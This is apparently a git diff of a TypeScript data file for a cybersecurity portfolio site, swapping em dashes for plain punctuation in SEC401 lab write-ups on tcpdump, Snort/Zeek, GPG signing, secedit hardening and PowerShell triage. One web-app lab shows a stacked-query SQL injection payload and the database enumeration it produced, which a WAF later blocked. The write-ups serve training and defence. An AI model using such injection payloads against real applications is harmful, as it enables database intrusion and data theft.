@@ -37,7 +37,7 @@ export interface CybersecurityLab {
   /** Skills demonstrated (ATS-friendly) */
   skillsDemonstrated?: string[];
   context: string;
-  /** Brief summary for main page card (1–2 sentences) */
+  /** Brief summary for main page card (1-2 sentences) */
   summary: string;
   /** Why this matters in a real attack; show early */
   whyThisMatters: string;
@@ -64,7 +64,7 @@ export const LABS: CybersecurityLab[] = [
     courseSlug: "sec401",
     slug: "tcpdump-traffic-analysis",
     legacySlug: "sec401-tcpdump",
-    title: "Lab 1.1 – tcpdump Traffic Analysis",
+    title: "Lab 1.1 - tcpdump Traffic Analysis",
     course: "SEC401 - Network Security and Cloud Essentials",
     role: "Solo, Lab",
     context: "This lab demonstrates how to analyze network traffic using tcpdump and extract meaningful patterns from a PCAP file.",
@@ -180,7 +180,7 @@ export const LABS: CybersecurityLab[] = [
     courseSlug: "sec401",
     slug: "wireshark-packet-analysis",
     legacySlug: "wireshark",
-    title: "Lab 1.2 – Wireshark Packet Analysis",
+    title: "Lab 1.2 - Wireshark Packet Analysis",
     course: "SEC401 - Network Security and Cloud Essentials",
     role: "Solo, Lab",
     context:
@@ -519,7 +519,7 @@ export const LABS: CybersecurityLab[] = [
     id: 4,
     courseSlug: "sec401",
     slug: "password-auditing",
-    title: "Lab 2.1 – Password Auditing",
+    title: "Lab 2.1 - Password Auditing",
     course: "SEC401 - Defense in Depth",
     role: "Solo, Lab",
     context:
@@ -1064,7 +1064,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Leaking the query via error",
         description:
-          "Submitted an empty search. The page printed both Array () (an empty result set) and a full PHP exception with the rendered SQL: SELECT * FROM Merchandise WHERE name LIKE '%'%'. That single line reveals: it's a LIKE query, the input is wrapped in single quotes, and stack traces are leaking to users — three serious issues before any payload.",
+          "Submitted an empty search. The page printed both Array () (an empty result set) and a full PHP exception with the rendered SQL: SELECT * FROM Merchandise WHERE name LIKE '%'%'. That single line reveals: it's a LIKE query, the input is wrapped in single quotes, and stack traces are leaking to users, three serious issues before any payload.",
         screenshot: "/labs/webapp-exploit-150744.png",
       },
       {
@@ -1088,7 +1088,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Observed error response",
         description:
-          "The server echoed the unsafe query directly back in the stack trace — a defender's nightmare because it tells the attacker exactly how to refine the payload.",
+          "The server echoed the unsafe query directly back in the stack trace, a defender's nightmare because it tells the attacker exactly how to refine the payload.",
         screenshot: "/labs/webapp-exploit-151742.png",
       },
       {
@@ -1112,7 +1112,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Database enumeration success",
         description:
-          "The page printed Array ( [0] => Database [1] => information_schema [2] => OnlineShop ). Confirmed the app's database is OnlineShop and stacked queries are fully allowed. From here an attacker can drop tables, write files, or escalate — the worst-case SQLi scenario.",
+          "The page printed Array ( [0] => Database [1] => information_schema [2] => OnlineShop ). Confirmed the app's database is OnlineShop and stacked queries are fully allowed. From here an attacker can drop tables, write files, or escalate, the worst-case SQLi scenario.",
         screenshot: "/labs/webapp-exploit-153532.png",
       },
       {
@@ -1158,7 +1158,7 @@ export const LABS: CybersecurityLab[] = [
     takeaway: [
       "LIKE-clause injection is underestimated because most devs think 'I'm using prepared statements, I'm safe.' But a prepared statement that binds user input as the LIKE pattern without escaping % and _ still lets an attacker return every row. The bug here isn't really string concatenation, it's treating user input as a complete pattern instead of a literal.",
       "The error page is worth as much as the injection itself. The stack trace echoed the exact generated SQL, which turned a five-minute exploit into a thirty-second one. In a real engagement I'd log 'SQL error: contact support' to the user and the full trace to a server-only log. Verbose errors in prod are a vulnerability amplifier.",
-      "The WAF worked, and that matters, but the framing is important. The app code is still exploitable. If the WAF ruleset changes, if the attacker finds an encoding the rules don't cover, or if someone routes around the WAF (internal VPC access, misconfigured origin), the exposure comes back. WAFs are brake pads, not brake lines — they buy you time, they're not the fix.",
+      "The WAF worked, and that matters, but the framing is important. The app code is still exploitable. If the WAF ruleset changes, if the attacker finds an encoding the rules don't cover, or if someone routes around the WAF (internal VPC access, misconfigured origin), the exposure comes back. WAFs are brake pads, not brake lines, they buy you time, they're not the fix.",
     ],
     screenshots: [
       { src: "/labs/webapp-exploit-150444.png", alt: "Lab stack startup", caption: "./start_3.3.sh (nginx + MySQL + php-fpm)" },
@@ -1174,7 +1174,7 @@ export const LABS: CybersecurityLab[] = [
       { src: "/labs/webapp-exploit-153532.png", alt: "Databases enumerated", caption: "Database, information_schema, OnlineShop" },
       { src: "/labs/webapp-exploit-154228.png", alt: "Enable WAF", caption: "scripts/enable_waf.sh" },
       { src: "/labs/webapp-exploit-154243.png", alt: "Retry payload behind WAF", caption: "qq'; show tables; -- " },
-      { src: "/labs/webapp-exploit-154304.png", alt: "WAF block", caption: "HTTP 418 — WAF blocked the request" },
+      { src: "/labs/webapp-exploit-154304.png", alt: "WAF block", caption: "HTTP 418: WAF blocked the request" },
     ],
   },
   {
@@ -1202,11 +1202,11 @@ export const LABS: CybersecurityLab[] = [
       "Incident workflow: restoring from a signed backup after tamper detection",
     ],
     context:
-      "This lab walks through the core building blocks of cryptographic integrity — hashing, key pairs, and digital signatures — using sha256sum and GnuPG. It ends with a realistic scenario: a suspected-tampered document that fails signature verification, forcing a restore from a backup whose signature is valid.",
+      "This lab walks through the core building blocks of cryptographic integrity, hashing, key pairs, and digital signatures, using sha256sum and GnuPG. It ends with a realistic scenario: a suspected-tampered document that fails signature verification, forcing a restore from a backup whose signature is valid.",
     summary:
       "Used sha256sum and xxd to prove hashes are content-bound, generated an RSA 3072-bit GPG identity, produced a detached signature, imported Madison Jeffries's public key, flagged a tampered Bankruptcy.docx via a BAD signature from GPG, reviewed the metadata with exiftool, then restored a clean backup copy that verified cleanly.",
     whyThisMatters:
-      "Hashing and signing are how defenders catch silent tampering — the attacker who changes one byte of a document, contract, or binary. Without integrity checks, you have no way to tell whether a file is the one the author sent or something an intermediate actor modified. This lab is the blue-team equivalent of 'don't trust the file, verify the signature.'",
+      "Hashing and signing are how defenders catch silent tampering, the attacker who changes one byte of a document, contract, or binary. Without integrity checks, you have no way to tell whether a file is the one the author sent or something an intermediate actor modified. This lab is the blue-team equivalent of 'don't trust the file, verify the signature.'",
     tools: ["sha256sum", "xxd", "sed", "gpg (GnuPG 2.2.27)", "exiftool"],
     steps: [
       "Create a file, hash it, rename it, hash again (identical)",
@@ -1263,7 +1263,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Import a third-party public key",
         description:
-          "Imported Madison Jeffries's public key from the lab backup directory. Post-import, --list-keys shows two pubkeys: our own at [ultimate] trust and Jeffries's (D200...BD90, rsa4096) at [unknown] trust, which is the correct default — GPG doesn't extend trust just because you imported a key.",
+          "Imported Madison Jeffries's public key from the lab backup directory. Post-import, --list-keys shows two pubkeys: our own at [ultimate] trust and Jeffries's (D200...BD90, rsa4096) at [unknown] trust, which is the correct default, GPG doesn't extend trust just because you imported a key.",
         command: "gpg --import /sec401/labs/4.1/backup/backup-jeffries... && gpg --list-keys",
         screenshot: "/labs/hashing-crypto-205618.png",
       },
@@ -1277,14 +1277,14 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Surface metadata with exiftool",
         description:
-          "Pulled metadata off Bankruptcy.docx. ExifTool reported standard DOCX internals plus Application: Microsoft Office Word, Pages: 2, Total Edit Time: 2982555.3 days — an obviously bogus value that on its own is a tampering indicator. Metadata review complements the cryptographic signal: even without a signature, the edit-time field alone warrants investigation.",
+          "Pulled metadata off Bankruptcy.docx. ExifTool reported standard DOCX internals plus Application: Microsoft Office Word, Pages: 2, Total Edit Time: 2982555.3 days, an obviously bogus value that on its own is a tampering indicator. Metadata review complements the cryptographic signal: even without a signature, the edit-time field alone warrants investigation.",
         command: "exiftool /media/sec401/CDROM/Bankruptcy.docx",
         screenshot: "/labs/hashing-crypto-205741.png",
       },
       {
         title: "Restore from backup, re-verify",
         description:
-          "Copied the signature backup to the lab folder. First verify attempt passed the .docx instead of the .asc (GPG rejected with 'no valid OpenPGP data found'). Re-ran against the .asc and GPG confirmed 'Good signature from Madison Jeffries' with a GPG WARNING that the key is not certified with a trusted signature — expected, because we haven't signed Jeffries's key with our own to extend trust.",
+          "Copied the signature backup to the lab folder. First verify attempt passed the .docx instead of the .asc (GPG rejected with 'no valid OpenPGP data found'). Re-ran against the .asc and GPG confirmed 'Good signature from Madison Jeffries' with a GPG WARNING that the key is not certified with a trusted signature, expected, because we haven't signed Jeffries's key with our own to extend trust.",
         command: "cp /media/sec401/CDROM/Bankruptcy.docx.asc /sec401/labs/4.1/backup/ && gpg --verify /sec401/labs/4.1/backup/Bankruptcy.docx.asc",
         screenshot: "/labs/hashing-crypto-210137.png",
       },
@@ -1312,8 +1312,8 @@ export const LABS: CybersecurityLab[] = [
     ],
     takeaway: [
       "The rename vs. sed demo is the cleanest way to internalize what a hash actually is. Most junior analysts can recite 'SHA-256 is a digest' without ever seeing that renaming a file preserves the hash while changing a single ASCII character obliterates it. Once you've watched 66a0...bb35f18 become 5891...6be03 because of a one-byte swap, you stop confusing filename with content integrity.",
-      "Signing is where most teams fall down operationally. Generating a key is trivial. Distributing the public key, training every consumer to verify before using, and keeping the private key somewhere that survives laptop loss — that's the actual work. In a production rollout I'd pair GPG with a hardware key (YubiKey in OpenPGP mode) so the private key never sits on disk, and I'd automate verification so humans aren't the last line of defense.",
-      "The Bankruptcy.docx scenario is a good teaching moment for two reasons. First, the cryptographic signal (BAD signature) is binary and unambiguous — either the file is the one Jeffries signed or it isn't. Second, the exiftool follow-up shows why you don't rely on any single indicator: metadata, signatures, and hashes each catch different things. In a real investigation, you'd combine all three with a chain-of-custody log before you made a call about authenticity.",
+      "Signing is where most teams fall down operationally. Generating a key is trivial. Distributing the public key, training every consumer to verify before using, and keeping the private key somewhere that survives laptop loss, that's the actual work. In a production rollout I'd pair GPG with a hardware key (YubiKey in OpenPGP mode) so the private key never sits on disk, and I'd automate verification so humans aren't the last line of defense.",
+      "The Bankruptcy.docx scenario is a good teaching moment for two reasons. First, the cryptographic signal (BAD signature) is binary and unambiguous, either the file is the one Jeffries signed or it isn't. Second, the exiftool follow-up shows why you don't rely on any single indicator: metadata, signatures, and hashes each catch different things. In a real investigation, you'd combine all three with a chain-of-custody log before you made a call about authenticity.",
     ],
     screenshots: [
       { src: "/labs/hashing-crypto-204343.png", alt: "Hash preserved across rename", caption: "sha256sum identical after mv" },
@@ -1396,7 +1396,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "PCAP replay with community rules: summary view",
         description:
-          "Replayed investigate.pcap through Snort with the community rules and alert_talos output. The summary groups alerts by SID and signature: SERVER-WEBAPP robots.txt access (14), backup access (15), POLICY-OTHER Microsoft Windows Terminal server request attempt (218), INDICATOR-SHELLCODE ssh CRC32 overflow filler (294), PROTOCOL-ICMP Unusual PING (15). The 294-alert ssh CRC32 row is the obvious thing to pivot on — that's a classic 2001-era exploit signature.",
+          "Replayed investigate.pcap through Snort with the community rules and alert_talos output. The summary groups alerts by SID and signature: SERVER-WEBAPP robots.txt access (14), backup access (15), POLICY-OTHER Microsoft Windows Terminal server request attempt (218), INDICATOR-SHELLCODE ssh CRC32 overflow filler (294), PROTOCOL-ICMP Unusual PING (15). The 294-alert ssh CRC32 row is the obvious thing to pivot on, that's a classic 2001-era exploit signature.",
         command: "snort -c etc/snort.lua -q -r investigate.pcap -A alert_talos -R rules/snort3-community.rules",
         commandBreakdown: "-r: read from PCAP\n-A alert_talos: Talos-style summary (grouped)\n-R: ruleset to load",
         screenshot: "/labs/ids-snort-zeek-163058.png",
@@ -1404,7 +1404,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Per-alert detail with alert_fast",
         description:
-          "Switched output mode to alert_fast for one-line-per-alert detail. Clearly shows [1:1325:14] INDICATOR-SHELLCODE ssh CRC32 overflow filler — Classification: Executable code was detected, Priority 1 — TCP 20.106.124.93 → 10.130.8.94:22. Every alert traces to the same source IP hammering the same host's SSH port with what Snort identifies as exploit shellcode fillers.",
+          "Switched output mode to alert_fast for one-line-per-alert detail. Clearly shows [1:1325:14] INDICATOR-SHELLCODE ssh CRC32 overflow filler, Classification: Executable code was detected, Priority 1, TCP 20.106.124.93 → 10.130.8.94:22. Every alert traces to the same source IP hammering the same host's SSH port with what Snort identifies as exploit shellcode fillers.",
         command: "snort -c etc/snort.lua -q -r investigate.pcap -A alert_fast -R rules/snort3-community.rules",
         commandBreakdown: "-A alert_fast: one alert per line (best for piping to grep/awk)",
         screenshot: "/labs/ids-snort-zeek-163255.png",
@@ -1428,7 +1428,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Inspect Zeek log schema",
         description:
-          "Pulled the field list from packet_filter.log using sed. The #fields header lists ts, node, filter, init, success, failure_reason — Zeek's self-describing tab-separated format. Every Zeek log carries this header, which makes downstream parsing (zeek-cut, awk, Splunk) trivial.",
+          "Pulled the field list from packet_filter.log using sed. The #fields header lists ts, node, filter, init, success, failure_reason, Zeek's self-describing tab-separated format. Every Zeek log carries this header, which makes downstream parsing (zeek-cut, awk, Splunk) trivial.",
         command: "sed -n 7p packet_filter.log | sed 's/\\t/\\n/g'",
         commandBreakdown: "sed -n 7p: print line 7 (the #fields header)\nsed 's/\\t/\\n/g': convert tabs to newlines for readability",
         screenshot: "/labs/ids-snort-zeek-171652.png",
@@ -1456,7 +1456,7 @@ export const LABS: CybersecurityLab[] = [
     takeaway: [
       "Snort and Zeek solve different halves of the problem and most teams pick only one. Snort tells you a known-bad pattern matched; Zeek tells you what actually happened on the wire, in context, regardless of whether a signature exists. Running them side by side on the same traffic is how you catch signatures for known attacks and still have log fidelity when a novel one shows up.",
       "HOME_NET = 'any' is the configuration bug nobody talks about. Many rules are written with directional context ($EXTERNAL_NET -> $HOME_NET), so leaving HOME_NET at the default means those rules either over-trigger or never trigger at all. On a new Snort deployment, fixing HOME_NET is step zero before you evaluate any ruleset quality.",
-      "The 294-alert SSH shellcode result is a good reminder that signature IDS is still useful — the CRC32 exploit is old, but the same pattern shows up in modern scanner tooling that hasn't been updated. Pairing that signal with Zeek's ssh.log (client software, auth success/failure counts, session duration) is how you go from 'IDS says exploit' to 'here's exactly what the attacker did next.' That's the pivot analysts get paid for.",
+      "The 294-alert SSH shellcode result is a good reminder that signature IDS is still useful, the CRC32 exploit is old, but the same pattern shows up in modern scanner tooling that hasn't been updated. Pairing that signal with Zeek's ssh.log (client software, auth success/failure counts, session duration) is how you go from 'IDS says exploit' to 'here's exactly what the attacker did next.' That's the pivot analysts get paid for.",
     ],
     screenshots: [
       { src: "/labs/ids-snort-zeek-162400.png", alt: "Snort config validation", caption: "snort -T loads all inspectors" },
@@ -1481,11 +1481,11 @@ export const LABS: CybersecurityLab[] = [
     date: "Apr 2026",
     artifacts: "Sanitized PowerShell and MMC screenshots from secedit.exe analyze/configure workflow",
     context:
-      "This lab demonstrates how to baseline a Windows host against a security template, identify policy drift, apply a hardened configuration, and verify the change — using secedit.exe from PowerShell and the Security Templates / Security Configuration and Analysis MMC snap-ins.",
+      "This lab demonstrates how to baseline a Windows host against a security template, identify policy drift, apply a hardened configuration, and verify the change, using secedit.exe from PowerShell and the Security Templates / Security Configuration and Analysis MMC snap-ins.",
     summary:
       "Used secedit.exe to analyze a Windows VM against the Alpha-Win-Wkstn-Basic-Sec-Policy template, surfaced MinimumPasswordLength, LockoutBadCount, and MaximumLogSize mismatches via Select-String on the log, applied the template with /configure, and re-analyzed to confirm the drift was eliminated.",
     whyThisMatters:
-      "Every Windows hardening program lives or dies on two questions: does this host match the baseline, and can you prove it after the fact? secedit /analyze and /configure are the oldest, simplest answer to both — zero extra tooling required, and the log format is grep-friendly. If you can't drive this workflow from a console you can't scale hardening to more than one host.",
+      "Every Windows hardening program lives or dies on two questions: does this host match the baseline, and can you prove it after the fact? secedit /analyze and /configure are the oldest, simplest answer to both, zero extra tooling required, and the log format is grep-friendly. If you can't drive this workflow from a console you can't scale hardening to more than one host.",
     tldr: [
       "secedit /analyze compared a live VM to the Alpha basic security template",
       "Surfaced 5 Mismatch entries (password length, lockout, event log size) via Select-String",
@@ -1520,21 +1520,21 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Analyze the VM against the Alpha basic template",
         description:
-          "Ran secedit /analyze against the Alpha-Win-Wkstn-Basic-Sec-Policy.inf template. The engine compares every setting in the template to the current VM state and writes per-setting results to the compare log. Task completed successfully means the analysis engine ran cleanly — the actual drift findings live in the log.",
+          "Ran secedit /analyze against the Alpha-Win-Wkstn-Basic-Sec-Policy.inf template. The engine compares every setting in the template to the current VM state and writes per-setting results to the compare log. Task completed successfully means the analysis engine ran cleanly, the actual drift findings live in the log.",
         command: "secedit.exe /analyze /db alpha-basic-policy.sdb /cfg Alpha-Win-Wkstn-Basic-Sec-Policy.inf /log C:\\sec401\\labs\\5.3\\compare-vm-to-alpha-basic-policy.log",
         screenshot: "/labs/win-policies-110611.png",
       },
       {
         title: "Open the compare log and scan for Mismatch",
         description:
-          "Opened the log in Notepad and used Find to jump through 'Mismatch' entries. The --Analyze Security Policy-- section shows MinimumPasswordLength as Mismatch while adjacent settings (PasswordHistorySize, MaximumPasswordAge, PasswordComplexity) are Not Configured — meaning the template doesn't define them. LockoutBadCount is also flagged.",
+          "Opened the log in Notepad and used Find to jump through 'Mismatch' entries. The --Analyze Security Policy-- section shows MinimumPasswordLength as Mismatch while adjacent settings (PasswordHistorySize, MaximumPasswordAge, PasswordComplexity) are Not Configured, meaning the template doesn't define them. LockoutBadCount is also flagged.",
         command: "notepad C:\\sec401\\labs\\5.3\\compare-vm-to-alpha-basic-policy.log",
         screenshot: "/labs/win-policies-110704.png",
       },
       {
         title: "Grep the log with Select-String",
         description:
-          "Piped Get-Content to Select-String 'mismatch' to list only the drift. Five Mismatch lines: MinimumPasswordLength, LockoutBadCount, and MaximumLogSize (x3 — one per event log: Application, Security, System). That's the exact hardening delta the template will apply.",
+          "Piped Get-Content to Select-String 'mismatch' to list only the drift. Five Mismatch lines: MinimumPasswordLength, LockoutBadCount, and MaximumLogSize (x3, one per event log: Application, Security, System). That's the exact hardening delta the template will apply.",
         command: "Get-Content .\\compare-vm-to-alpha-basic-policy.log | Select-String 'mismatch'",
         commandBreakdown: "Get-Content: read file into pipeline\nSelect-String: pattern match (PowerShell's grep)",
         screenshot: "/labs/win-policies-110748.png",
@@ -1550,20 +1550,20 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Re-analyze to verify the drift is gone",
         description:
-          "Ran /analyze a second time and wrote the output to recompare-vm-to-alpha-basic-policy.log. Running the compare twice — once before /configure and once after — is the evidence pattern: the second log should show zero Mismatch entries, which proves the template was applied successfully.",
+          "Ran /analyze a second time and wrote the output to recompare-vm-to-alpha-basic-policy.log. Running the compare twice, once before /configure and once after, is the evidence pattern: the second log should show zero Mismatch entries, which proves the template was applied successfully.",
         command: "secedit.exe /analyze /db alpha-basic-policy.sdb /log C:\\sec401\\labs\\5.3\\recompare-vm-to-alpha-basic-policy.log",
         screenshot: "/labs/win-policies-111344.png",
       },
       {
         title: "Load the MMC snap-ins",
         description:
-          "Added Security Templates and Security Configuration and Analysis to an MMC console. The MMC snap-ins are the GUI equivalent of secedit /analyze and /configure — useful for editing .inf templates interactively and for analysts who prefer a tree view. Same engine, different surface.",
+          "Added Security Templates and Security Configuration and Analysis to an MMC console. The MMC snap-ins are the GUI equivalent of secedit /analyze and /configure, useful for editing .inf templates interactively and for analysts who prefer a tree view. Same engine, different surface.",
         command: "mmc.exe  (File → Add/Remove Snap-in → Security Templates, Security Configuration and Analysis)",
         screenshot: "/labs/win-policies-111527.png",
       },
     ],
     outcome:
-      "Demonstrated the full Windows baseline compliance loop: analyze a host against a template, surface the exact drift with Select-String, apply the template, and re-analyze to prove the drift is gone — all from a single PowerShell console with secedit.exe.",
+      "Demonstrated the full Windows baseline compliance loop: analyze a host against a template, surface the exact drift with Select-String, apply the template, and re-analyze to prove the drift is gone, all from a single PowerShell console with secedit.exe.",
     nextStepsInProduction:
       "In a fleet environment, push the .inf template via Group Policy (SCE → Security Settings) instead of running secedit host-by-host. Automate the analyze/configure/reanalyze loop with a PowerShell wrapper so the compare logs land in a central share for audit evidence. Replace the basic template with a CIS Benchmark or Microsoft Security Compliance Toolkit baseline and extend the detection pipeline so any Mismatch on a production host raises a SIEM alert.",
     securityControlsRelevant: [
@@ -1582,14 +1582,14 @@ export const LABS: CybersecurityLab[] = [
     ],
     takeaway: [
       "secedit is one of those tools that's been in Windows forever and still does exactly what you want. /analyze and /configure are both idempotent and log-first, which makes them trivially scriptable: run analyze, grep for Mismatch, run configure, run analyze again, diff. That before/after pair of logs is also the cleanest audit artifact you can hand an assessor.",
-      "The Not Configured vs. Mismatch distinction in the log matters. Not Configured means the template is silent on that setting — the host can do whatever it wants. Mismatch means the template has an opinion and the host disagrees. A lot of 'we applied the baseline' incidents trace back to teams not reading this distinction and assuming Not Configured means compliant.",
-      "The real production move is GPO, not host-by-host secedit. But understanding secedit is what makes the GPO debugging tractable — when a policy doesn't apply on one host, dropping to secedit /analyze on that box is the fastest way to see which specific setting didn't take and why.",
+      "The Not Configured vs. Mismatch distinction in the log matters. Not Configured means the template is silent on that setting, the host can do whatever it wants. Mismatch means the template has an opinion and the host disagrees. A lot of 'we applied the baseline' incidents trace back to teams not reading this distinction and assuming Not Configured means compliant.",
+      "The real production move is GPO, not host-by-host secedit. But understanding secedit is what makes the GPO debugging tractable, when a policy doesn't apply on one host, dropping to secedit /analyze on that box is the fastest way to see which specific setting didn't take and why.",
     ],
     screenshots: [
-      { src: "/labs/win-policies-110317.png", alt: "secedit /analyze syntax", caption: "secedit.exe /analyze — help text and required parameters" },
+      { src: "/labs/win-policies-110317.png", alt: "secedit /analyze syntax", caption: "secedit.exe /analyze: help text and required parameters" },
       { src: "/labs/win-policies-110611.png", alt: "Analyze against Alpha basic template", caption: "secedit /analyze against Alpha-Win-Wkstn-Basic-Sec-Policy.inf" },
       { src: "/labs/win-policies-110704.png", alt: "Compare log in Notepad", caption: "MinimumPasswordLength and LockoutBadCount Mismatch entries" },
-      { src: "/labs/win-policies-110748.png", alt: "Select-String mismatch", caption: "Get-Content | Select-String 'mismatch' — 5 drift lines" },
+      { src: "/labs/win-policies-110748.png", alt: "Select-String mismatch", caption: "Get-Content | Select-String 'mismatch': 5 drift lines" },
       { src: "/labs/win-policies-111118.png", alt: "secedit /configure", caption: "Apply template with secedit /configure" },
       { src: "/labs/win-policies-111344.png", alt: "Re-analyze after configure", caption: "secedit /analyze → recompare log as before/after evidence" },
       { src: "/labs/win-policies-111527.png", alt: "MMC snap-ins", caption: "Security Templates + Security Configuration and Analysis in MMC" },
@@ -1611,7 +1611,7 @@ export const LABS: CybersecurityLab[] = [
     summary:
       "Used PowerShell cmdlets, the object pipeline, Out-GridView, and Invoke-Command against three remote alpha-svr hosts to enumerate processes and services, then hunted a suspicious BrokerSvc service running broker.exe as LocalSystem and captured its SHA-256 for IOC sharing.",
     whyThisMatters:
-      "Windows attackers live on the box with the same tools defenders use. Fluency in PowerShell — pipelines, remoting, Get-WinEvent, Get-FileHash — is what lets a blue-team analyst triage a 3-host (or 3000-host) incident without drowning in RDP sessions or GUI clicks. This lab builds exactly that muscle.",
+      "Windows attackers live on the box with the same tools defenders use. Fluency in PowerShell, pipelines, remoting, Get-WinEvent, Get-FileHash, is what lets a blue-team analyst triage a 3-host (or 3000-host) incident without drowning in RDP sessions or GUI clicks. This lab builds exactly that muscle.",
     tldr: [
       "Pipelined Get-Process/Get-Service with Where-Object, Measure-Object, Out-GridView, Export-CSV",
       "Used Invoke-Command with Get-Credential to run remote queries against alpha-svr1/2/3.local",
@@ -1648,7 +1648,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Deep property view on a single process",
         description:
-          "Piped one process into Select-Object -Property * to expose every property the object exposes — FileVersion, Path, Company, HandleCount, WorkingSet, VirtualMemorySize, BasePriority. This is how you learn what you can filter on before writing a Where-Object clause.",
+          "Piped one process into Select-Object -Property * to expose every property the object exposes, FileVersion, Path, Company, HandleCount, WorkingSet, VirtualMemorySize, BasePriority. This is how you learn what you can filter on before writing a Where-Object clause.",
         command: "Get-Process -Name explorer | Select-Object -Property *",
         commandBreakdown: "-Name: match by process name\nSelect-Object -Property *: dump every property on the pipeline object",
         screenshot: "/labs/powershell-101835.png",
@@ -1656,35 +1656,35 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Launch and inspect a process",
         description:
-          "Started Notepad with Start-Process, then introspected it with Select-Object *. Confirmed the AppX path under C:\\Program Files\\WindowsApps — useful detail when triaging whether a running binary is the Microsoft-signed Store build or a sideloaded copy.",
+          "Started Notepad with Start-Process, then introspected it with Select-Object *. Confirmed the AppX path under C:\\Program Files\\WindowsApps, useful detail when triaging whether a running binary is the Microsoft-signed Store build or a sideloaded copy.",
         command: "Start-Process notepad.exe\nGet-Process -Name notepad | Select-Object *",
         screenshot: "/labs/powershell-102038.png",
       },
       {
         title: "Capture a process into a variable",
         description:
-          "Stored the Notepad process object in $NotepadProc. Variables in PowerShell hold live objects (not strings), so $NotepadProc carries every method and property the process exposes — which is why the next step works.",
+          "Stored the Notepad process object in $NotepadProc. Variables in PowerShell hold live objects (not strings), so $NotepadProc carries every method and property the process exposes, which is why the next step works.",
         command: "$NotepadProc = Get-Process -Name notepad\n$NotepadProc",
         screenshot: "/labs/powershell-102203.png",
       },
       {
         title: "Invoke a method on the stored object",
         description:
-          "Called .kill() on the stored object to terminate Notepad, then re-queried Get-Process to confirm the process is gone (ObjectNotFound error proves the kill succeeded). This pattern — capture, act, re-verify — is the bread-and-butter of automated incident response.",
+          "Called .kill() on the stored object to terminate Notepad, then re-queried Get-Process to confirm the process is gone (ObjectNotFound error proves the kill succeeded). This pattern, capture, act, re-verify, is the bread-and-butter of automated incident response.",
         command: "$NotepadProc.kill()\nGet-Process -Name notepad",
         screenshot: "/labs/powershell-102336.png",
       },
       {
         title: "Enumerate Windows services",
         description:
-          "Get-Service returns every service with Status, Name, and DisplayName. Same object-pipeline story as Get-Process — downstream cmdlets operate on service objects, not parsed text.",
+          "Get-Service returns every service with Status, Name, and DisplayName. Same object-pipeline story as Get-Process, downstream cmdlets operate on service objects, not parsed text.",
         command: "Get-Service",
         screenshot: "/labs/powershell-102442.png",
       },
       {
         title: "Count services with Measure-Object",
         description:
-          "Piped Get-Service to Measure-Object — 278 services installed on this host. Measure-Object is the PowerShell analog to wc -l, except it counts pipeline objects, not lines of text.",
+          "Piped Get-Service to Measure-Object, 278 services installed on this host. Measure-Object is the PowerShell analog to wc -l, except it counts pipeline objects, not lines of text.",
         command: "Get-Service | Measure-Object",
         screenshot: "/labs/powershell-102511.png",
       },
@@ -1699,14 +1699,14 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Count the running services",
         description:
-          "Chained the same filter into Measure-Object — 96 of 278 services are Running. Two cmdlets, one pipeline, zero intermediate files.",
+          "Chained the same filter into Measure-Object, 96 of 278 services are Running. Two cmdlets, one pipeline, zero intermediate files.",
         command: "Get-Service | Where-Object -Property Status -like Running | Measure-Object",
         screenshot: "/labs/powershell-102659.png",
       },
       {
         title: "Out-GridView for interactive triage",
         description:
-          "Piped Get-Service to Out-GridView — a sortable, filterable GUI grid. Out-GridView is a triage tool: you can click-filter to a subset, then send the selection back to the pipeline for further processing.",
+          "Piped Get-Service to Out-GridView, a sortable, filterable GUI grid. Out-GridView is a triage tool: you can click-filter to a subset, then send the selection back to the pipeline for further processing.",
         command: "Get-Service | Out-GridView",
         screenshot: "/labs/powershell-102750.png",
       },
@@ -1720,7 +1720,7 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Export to CSV and open in ISE",
         description:
-          "Dumped every service object to Services.csv with Export-Csv, then opened it in the PowerShell ISE for inspection. Export-Csv serializes every property of every pipeline object — great for offline analysis or evidence preservation.",
+          "Dumped every service object to Services.csv with Export-Csv, then opened it in the PowerShell ISE for inspection. Export-Csv serializes every property of every pipeline object, great for offline analysis or evidence preservation.",
         command: "Get-Service | Export-CSV -Path Services.csv\nise .\\Services.csv",
         screenshot: "/labs/powershell-102956.png",
       },
@@ -1734,14 +1734,14 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Inspect a file as an object",
         description:
-          "Piped one CSV into Format-List * to expose every property on the FileSystemInfo object — PSPath, VersionInfo, BaseName, Length. Same object-pipeline mental model as processes and services: a file is an object with properties, not just a name.",
+          "Piped one CSV into Format-List * to expose every property on the FileSystemInfo object, PSPath, VersionInfo, BaseName, Length. Same object-pipeline mental model as processes and services: a file is an object with properties, not just a name.",
         command: "dir .\\Services.csv | Format-List *",
         screenshot: "/labs/powershell-103151.png",
       },
       {
         title: "Sort directory listing by CreationTime",
         description:
-          "Piped dir into Sort-Object CreationTime — Services.csv sorts last because it was just created, while the original .ps1 scripts share an older 12/16/2023 timestamp.",
+          "Piped dir into Sort-Object CreationTime, Services.csv sorts last because it was just created, while the original .ps1 scripts share an older 12/16/2023 timestamp.",
         command: "dir | Sort-Object CreationTime",
         screenshot: "/labs/powershell-103447.png",
       },
@@ -1755,29 +1755,29 @@ export const LABS: CybersecurityLab[] = [
       {
         title: "Invoke-Command across the fleet with credentials",
         description:
-          "Captured credentials with Get-Credential, then ran Get-CimInstance Win32_OperatingSystem remotely on all three alpha-svr hosts in one call. The output is a single table with a PSComputerName column — Invoke-Command returns deserialized objects from every remote host, merged into one pipeline.",
+          "Captured credentials with Get-Credential, then ran Get-CimInstance Win32_OperatingSystem remotely on all three alpha-svr hosts in one call. The output is a single table with a PSComputerName column, Invoke-Command returns deserialized objects from every remote host, merged into one pipeline.",
